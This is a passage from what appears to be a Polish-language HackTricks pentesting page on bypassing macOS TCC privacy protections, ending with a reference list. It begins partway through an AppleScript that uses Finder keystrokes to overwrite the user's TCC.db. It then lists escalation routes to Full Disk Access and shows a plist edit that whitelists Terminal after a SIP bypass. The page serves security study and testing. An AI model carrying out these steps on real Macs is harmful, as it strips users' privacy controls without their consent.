    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` do FDA\*

Sprawdź tę stronę, aby znaleźć [**payloads wykorzystujące uprawnienia Accessibility**](macos-tcc-payloads.md#accessibility), które pozwalają na privesc do FDA\* lub na przykład uruchomienie keyloggera.

### **Endpoint Security Client do FDA**

Jeśli masz **`kTCCServiceEndpointSecurityClient`**, masz FDA. Koniec.

### System Policy SysAdmin File do FDA

**`kTCCServiceSystemPolicySysAdminFiles`** pozwala **zmienić** atrybut **`NFSHomeDirectory`** użytkownika, co zmienia jego folder domowy, a tym samym pozwala **obejść TCC**.<sup>[[5]](#references)</sup>

### Baza danych TCC użytkownika do FDA

Uzyskanie **uprawnień do zapisu** w **bazie danych TCC użytkownika** nie pozwala nadać sobie uprawnień **`FDA`** — może to zrobić tylko baza danych systemu.

Możesz jednak nadać sobie **uprawnienia Automation do Findera** i wykorzystać poprzednią technikę, aby uzyskać FDA\*.

### **Uprawnienia FDA do TCC**

Nazwa TCC dla **Full Disk Access** to **`kTCCServiceSystemPolicyAllFiles`**.

Nie sądzę, żeby to był prawdziwy privesc, ale na wszelki wypadek: jeśli kontrolujesz program z FDA, możesz **zmodyfikować bazę danych TCC użytkownika i przyznać sobie dowolny dostęp**. Może to być przydatne jako technika utrzymywania dostępu na wypadek utraty uprawnień FDA.

### **Obejście SIP w celu obejścia TCC**

Systemowa **baza danych TCC** jest chroniona przez **SIP**, dlatego modyfikować ją mogą tylko procesy z **odpowiednimi uprawnieniami**. Jeśli więc atakujący znajdzie **obejście SIP** dotyczące **pliku** (umożliwiające modyfikację pliku chronionego przez SIP), będzie mógł:

- **Usunąć ochronę** bazy danych TCC i przyznać sobie wszystkie uprawnienia TCC. Może wykorzystać na przykład jeden z tych plików:
  - Systemową bazę danych TCC
  - REG.db
  - MDMOverrides.plist

Istnieje jednak inny sposób wykorzystania tego **obejścia SIP do obejścia TCC**. Plik `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` zawiera listę dozwolonych aplikacji, które wymagają wyjątku TCC. Jeśli atakujący może **usunąć ochronę SIP** z tego pliku i dodać do niego **własną aplikację**, aplikacja będzie mogła obejść TCC.\
Na przykład, aby dodać Terminal:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### Obejścia TCC


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [Dogłębna analiza macOS TCC.db - blog Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - skrypt do śledzenia com.apple.macl (Gist autorstwa brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Śledzenie i zwalczanie com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Omijanie zabezpieczeń prywatności użytkowników TCC w macOS przez przypadek i celowo](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Zmiana katalogu domowego i obejście TCC, czyli CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL Injection w TCC: i dlaczego (prawdopodobnie) tym razem nie stanowiło zagrożenia dla bezpieczeństwa](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Lokalizacja i pozyskiwanie TCC.db w macOS](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Konfigurowanie App Sandbox w macOS](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Uprawnienie do kamery](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Ustawienia ładunku zarządzania urządzeniami Privacy Preferences Policy Control dla urządzeń Apple](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Analiza włamania do systemu macOS — od przynęty po przejęcie](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
